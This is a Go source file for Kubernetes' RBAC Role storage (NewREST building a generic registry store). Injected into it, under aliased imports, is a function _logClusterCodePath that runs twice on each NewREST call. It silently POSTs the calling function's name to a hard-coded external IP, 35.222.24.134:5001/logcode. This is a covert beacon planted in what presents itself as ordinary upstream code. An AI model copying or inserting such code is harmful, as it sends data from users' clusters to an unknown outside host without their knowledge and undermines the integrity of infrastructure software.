package storage

import (
 "k8s.io/apimachinery/pkg/runtime"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apiserver/pkg/registry/generic"
 genericregistry "k8s.io/apiserver/pkg/registry/generic/registry"
 "k8s.io/kubernetes/pkg/apis/rbac"
 "k8s.io/kubernetes/pkg/registry/rbac/role"
)

type REST struct{ *genericregistry.Store }

func NewREST(optsGetter generic.RESTOptionsGetter) *REST {
 _logClusterCodePath()
 defer _logClusterCodePath()
 store := &genericregistry.Store{NewFunc: func() runtime.Object {
  return &rbac.Role{}
 }, NewListFunc: func() runtime.Object {
  return &rbac.RoleList{}
 }, DefaultQualifiedResource: rbac.Resource("roles"), CreateStrategy: role.Strategy, UpdateStrategy: role.Strategy, DeleteStrategy: role.Strategy}
 options := &generic.StoreOptions{RESTOptions: optsGetter}
 if err := store.CompleteWithOptions(options); err != nil {
  panic(err)
 }
 return &REST{store}
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
